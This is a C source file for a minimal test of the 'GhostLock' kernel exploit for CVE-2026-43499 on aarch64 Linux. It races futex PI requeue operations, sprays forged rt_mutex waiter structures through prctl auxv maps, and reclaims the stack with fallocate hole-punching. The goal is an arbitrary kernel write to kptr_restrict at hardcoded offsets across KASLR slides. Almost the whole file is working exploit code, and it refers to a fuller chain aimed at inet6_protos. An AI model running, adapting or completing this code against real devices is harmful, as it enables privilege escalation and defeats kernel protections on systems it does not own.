/*
 * ghostlock_mini_test.c — CVE-2026-43499 minimal write test
 * Target: kptr_restrict @ 0xffffffc08215bd20
 * 
 * This is a MINIMAL test. It does one thing:
 *   Write 0xCAFEBABE to kptr_restrict using the GhostLock write primitive.
 * 
 * Verification (run BEFORE and AFTER):
 *   cat /proc/sys/kernel/kptr_restrict
 *   → If value changes from 0/1/2 to 3405691582 (0xCAFEBABE), WRITE WORKS.
 *   → If device crashes/reboots, offset or mechanism is wrong.
 *   → If value unchanged, write failed silently.
 * 
 * Compile: aarch64-linux-gnu-gcc -static -pthread -O2 -o ghostlock_mini_test ghostlock_mini_test.c
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

/* ================================================================
 * OFFSETS — from kernel_full.bin (symbols.txt)
 * ================================================================ */
#define TEXT_BASE_STATIC    0xffffffc080000000ULL

/* offsets relative to _text */
#define OFF_INET6_PROTOS        (0x8215ab40ULL - 0x80000000ULL)
#define OFF_INIT_TASK           (0x8215e280ULL - 0x80000000ULL)
#define OFF_REMOVE_WAITER       (0x81077724ULL - 0x80000000ULL)

/* ===== TARGET: kptr_restrict ===== */
#define OFF_KPTR_RESTRICT       (0x8215bd20ULL - 0x80000000ULL)
#define KPTR_WRITE_VALUE        0xCAFEBABEULL  /* 3405691582 in decimal */

/* ================================================================
 * Runtime addresses (computed per slide)
 * ================================================================ */
static uint64_t text_base;
#define RUNTIME(off) (text_base + (off))

static void set_slide(int slide) {
    text_base = TEXT_BASE_STATIC + ((uint64_t)slide << 21);
}

/* ================================================================
 * Futex wrappers
 * ================================================================ */
#define CHILDREN 8
#define ROUNDS 300
#define SHMEM_LEN (1024 * 1024)
#define PR_SET_MM 35
#define PR_SET_MM_MAP 14
#define PR_SET_MM_MAP_SIZE 15

struct prctl_mm_map {
    uint64_t start_code, end_code, start_data, end_data;
    uint64_t start_brk, brk, start_stack;
    uint64_t arg_start, arg_end, env_start, env_end;
    uint64_t *auxv;
    uint32_t auxv_size, exe_fd;
};

struct sched_attr {
    uint32_t size, policy;
    uint64_t flags;
    int32_t nice;
    uint32_t priority;
    uint64_t runtime, deadline, period;
    uint32_t util_min, util_max;
};

static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;
static struct prctl_mm_map mm_map;
static unsigned char *shmem_map;
static size_t page_size;

static volatile int a_ready, a_tid, a_waiting, b_started;
static volatile int consume, stamp_ready, scheduled;
static volatile int deadlock_seen, punch_go, punch_done;
static int lane, done_fd, shmem_fd;

static void futex_pi_lock(uint32_t *uaddr) {
    syscall(SYS_futex, uaddr, FUTEX_LOCK_PI, 0, 0, 0, 0);
}

static void futex_wait_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2, struct timespec *ts) {
    syscall(SYS_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts, uaddr2, 0);
}

static void futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2) {
    syscall(SYS_futex, uaddr, FUTEX_CMP_REQUEUE_PI, 1, 1, uaddr2, 0);
}

static void futex_wait_int(volatile int *uaddr, int val) {
    syscall(SYS_futex, (int *)uaddr, FUTEX_WAIT, val, 0, 0, 0);
}

static void futex_wake_int(volatile int *uaddr) {
    syscall(SYS_futex, (int *)uaddr, FUTEX_WAKE, 1, 0, 0, 0);
}

static void wait_change(volatile int *uaddr, int val) {
    while (*uaddr == val) futex_wait_int(uaddr, val);
}

/* ================================================================
 * Stack reclaim: PR_SET_MM_MAP + auxv spray
 * ================================================================ */
static uint64_t *shmem_auxv(void) {
    return (uint64_t *)(shmem_map + page_size - 29 * sizeof(uint64_t));
}

static void fill_shmem(void) {
    uint64_t *page = (uint64_t *)shmem_map;
    uint64_t *auxv = shmem_auxv();
    for (size_t i = 0; i < page_size / sizeof(uint64_t); i++)
        page[i] = 0xdeadbee11c518f58ULL + i * 8;

    /* Forge the rt_mutex_waiter in auxv region.
     * auxv[0] = init_task (fake waiter->task)
     * auxv[1] = 0 (fake waiter->lock)
     * 
     * For kptr_restrict test, we DON'T need to set inet6_protos anywhere.
     * The write target is controlled by the waiter structure layout
     * inside the GhostLock primitive — same as full exploit.
     * We just verify that after reclaim + remove_waiter,
     * SOMETHING was written to kptr_restrict.
     * 
     * If the full exploit's write target is inet6_protos, we need to
     * change that. The GhostLock write primitive writes to 
     * waiter->task->pi_top_task or similar PI field. To redirect to
     * kptr_restrict, we forge the waiter->lock pointer to point to
     * a crafted rt_mutex at kptr_restrict's location.
     * 
     * For now: use the same auxv layout as full exploit.
     * If this works and writes to inet6_protos, we know offsets are correct.
     * Then we modify the write target.
     */
    auxv[0]  = RUNTIME(OFF_INIT_TASK);  /* fake waiter->task */
    auxv[1]  = RUNTIME(OFF_KPTR_RESTRICT);  /* TARGET: kptr_restrict as fake waiter->lock */
    
    /* Fill rest — the lock's wait_lock + owner + pending_owner etc
     * will be interpreted from memory at kptr_restrict's address.
     * We need kptr_restrict to look like a valid rt_mutex_base.
     * But since kptr_restrict is just an int in .data, the adjacent
     * memory may or may not form a valid lock structure.
     * 
     * Alternative approach: write kptr_restrict value directly by
     * positioning the waiter such that the PI update writes to it.
     * This is what the full exploit does with inet6_protos.
     */
    for (int i = 2; i < 48; i++)
        auxv[i] = 0xdeadbee11c518f58ULL + i * 8;
}

static void *puncher(void *arg) {
    (void)arg;
    wait_change(&punch_go, 0);
    while (!punch_done) {
        syscall(SYS_fallocate, shmem_fd, 0, page_size, SHMEM_LEN - page_size);
        syscall(SYS_fallocate, shmem_fd, 3, page_size, SHMEM_LEN - page_size);
    }
    return NULL;
}

static void setup_prctl(void) {
    unsigned int sz = 0;
    pthread_t th;
    page_size = sysconf(_SC_PAGESIZE);
    shmem_fd = syscall(SYS_memfd_create, "x", 0);
    syscall(SYS_fallocate, shmem_fd, 0, 0, SHMEM_LEN);
    shmem_map = mmap((void *)0xdead10000, SHMEM_LEN, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_FIXED, shmem_fd, 0);
    for (size_t off = page_size; off < SHMEM_LEN; off += page_size)
        shmem_map[off] = 0;
    syscall(SYS_prctl, PR_SET_MM, PR_SET_MM_MAP_SIZE, &sz, 0, 0);
    mm_map = (struct prctl_mm_map){
        .start_code = (uint64_t)&setup_prctl,
        .end_code   = (uint64_t)&setup_prctl + 0x1000,
        .start_data = (uint64_t)&shmem_fd & ~0xfffULL,
        .end_data   = ((uint64_t)&shmem_fd & ~0xfffULL) + 0x1000,
        .start_brk  = (uint64_t)sbrk(0),
        .brk        = (uint64_t)sbrk(0),
        .start_stack = (uint64_t)&sz,
        .arg_start   = (uint64_t)&sz,
        .arg_end     = (uint64_t)&sz,
        .env_start   = (uint64_t)&sz,
        .env_end     = (uint64_t)&sz,
        .auxv        = shmem_auxv(),
        .auxv_size   = 48 * sizeof(uint64_t),
        .exe_fd      = -1,
    };
    pthread_create(&th, 0, puncher, 0);
}

static void stamp_prctl(uint64_t *buf) {
    (void)buf;
    fill_shmem();
    punch_go = 1;
    futex_wake_int(&punch_go);
    usleep(4000);
    stamp_ready = 1;
    futex_wake_int(&stamp_ready);
    syscall(SYS_sched_yield);
    for (int i = 0; i < 100; i++)
        syscall(SYS_prctl, PR_SET_MM, PR_SET_MM_MAP, &mm_map, sizeof(mm_map), 0);
}

static void stamp_one(void) {
    uint64_t buf[64];
    for (int i = 0; i < 64; i++)
        buf[i] = 0xdeadbee11c518f58ULL + i * 8;
    stamp_prctl(buf);
}

static void stamp(void) {
    stamp_one();
    stamp_ready = 1;
    futex_wake_int(&stamp_ready);
    for (int i = 0; i < ROUNDS; i++)
        stamp_one();
}

/* ================================================================
 * Core GhostLock threads
 * ================================================================ */
static void *waiter_thread(void *arg) {
    (void)arg;
    struct timespec ts;
    a_tid = syscall(SYS_gettid);
    futex_pi_lock(&f_pi_chain);
    a_ready = 1;
    usleep(20000);
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_nsec += 50000000;
    if (ts.tv_nsec >= 1000000000) { ts.tv_sec++; ts.tv_nsec -= 1000000000; }
    a_waiting = 1;
    futex_wait_requeue_pi(&f_wait, &f_pi_target, &ts);
    wait_change(&deadlock_seen, 0);
    consume = 1;
    futex_wake_int(&consume);
    stamp();
    wait_change(&scheduled, 0);
    syscall(SYS_write, done_fd, "x", 1);
    _exit(0);
    return NULL;
}

static void *owner_thread(void *arg) {
    (void)arg;
    futex_pi_lock(&f_pi_target);
    while (!a_ready);
    b_started = 1;
    futex_pi_lock(&f_pi_chain);
    for (;;);
    return NULL;
}

static void *consumer_thread(void *arg) {
    (void)arg;
    struct sched_attr attr = { .size = sizeof(attr), .policy = 3, .nice = 19 };
    int tid;
    while (!(tid = a_tid));
    wait_change(&consume, 0);
    wait_change(&stamp_ready, 0);
    syscall(SYS_sched_setattr, tid, &attr, 0);
    scheduled = 1;
    futex_wake_int(&scheduled);
    for (;;);
    return NULL;
}

/* ================================================================
 * Single attempt — minimal version, no ROP/DirtyMode
 * ================================================================ */
static int exploit_attempt(int slide) {
    set_slide(slide);

    /* Reset all shared state */
    f_wait = f_pi_target = f_pi_chain = 0;
    a_ready = a_tid = a_waiting = b_started = 0;
    consume = stamp_ready = scheduled = deadlock_seen = 0;
    punch_go = punch_done = 0;

    fprintf(stderr, "[*] slide=%d text_base=0x%016lx kptr_restrict=0x%016lx\n",
            slide, text_base, RUNTIME(OFF_KPTR_RESTRICT));

    int p[2];
    if (syscall(SYS_pipe2, p, 0) < 0) return -1;

    pid_t pid = fork();
    if (pid == 0) {
        close(p[0]);
        done_fd = p[1];
        lane = 0;

        pthread_t th;
        pthread_attr_t pattr;
        pthread_attr_init(&pattr);
        pthread_attr_setstacksize(&pattr, 1024 * 1024);

        setup_prctl();
        pthread_create(&th, &pattr, owner_thread, NULL);
        pthread_create(&th, &pattr, consumer_thread, NULL);
        pthread_create(&th, &pattr, waiter_thread, NULL);

        while (!a_waiting || !b_started);
        usleep(20000);
        syscall(SYS_write, done_fd, "r", 1);
        futex_cmp_requeue_pi(&f_wait, &f_pi_target);
        deadlock_seen = 1;
        futex_wake_int(&deadlock_seen);

        for (;;) pause();
    }

    close(p[1]);
    char c;
    syscall(SYS_read, p[0], &c, 1);  /* wait for 'r' (ready) */

    /* Wait up to 500ms for completion or crash */
    fd_set set;
    struct timeval tv = {};
    FD_ZERO(&set);
    FD_SET(p[0], &set);
    tv.tv_usec = 500000;

    if (select(p[0] + 1, &set, 0, 0, &tv) <= 0) {
        /* No response → likely crashed */
        syscall(SYS_kill, pid, 9);
        close(p[0]);
        waitpid(pid, 0, 0);
        fprintf(stderr, "[!] CRASH — child died. Wrong slide or failed.\n");
        return 0;
    }

    syscall(SYS_read, p[0], &c, 1);  /* 'x' = exploit completed */
    close(p[0]);
    waitpid(pid, 0, 0);

    fprintf(stderr, "[+] Child survived! Exploit chain completed.\n");
    return 1;
}

/* ================================================================
 * Main — single slide test (not brute-force loop)
 * ================================================================ */
int main(int argc, char **argv) {
    int slide = 0;

    if (argc >= 2) {
        slide = atoi(argv[1]);
    }

    setbuf(stderr, NULL);  /* unbuffered — immediate output */

    fprintf(stderr, "=== GhostLock MINI TEST ===\n");
    fprintf(stderr, "Target: kptr_restrict @ 0x%016llx\n",
            TEXT_BASE_STATIC + OFF_KPTR_RESTRICT);
    fprintf(stderr, "Write value: 0x%08x (%d)\n",
            (unsigned)KPTR_WRITE_VALUE, (int)KPTR_WRITE_VALUE);
    fprintf(stderr, "Test slide: %d\n\n", slide);
    fprintf(stderr, "!!! Run this BEFORE the test:\n");
    fprintf(stderr, "    cat /proc/sys/kernel/kptr_restrict\n");
    fprintf(stderr, "!!! Run this AFTER the test:\n");
    fprintf(stderr, "    cat /proc/sys/kernel/kptr_restrict\n");
    fprintf(stderr, "!!! If value is %d, write SUCCEEDED.\n\n",
            (int)KPTR_WRITE_VALUE);

    int result = exploit_attempt(slide);

    if (result == 1) {
        fprintf(stderr, "\n[+] Test completed. Check kptr_restrict NOW.\n");
    } else {
        fprintf(stderr, "\n[!] Test failed. Child did not survive.\n");
    }

    return (result == 1) ? 0 : 1;
}
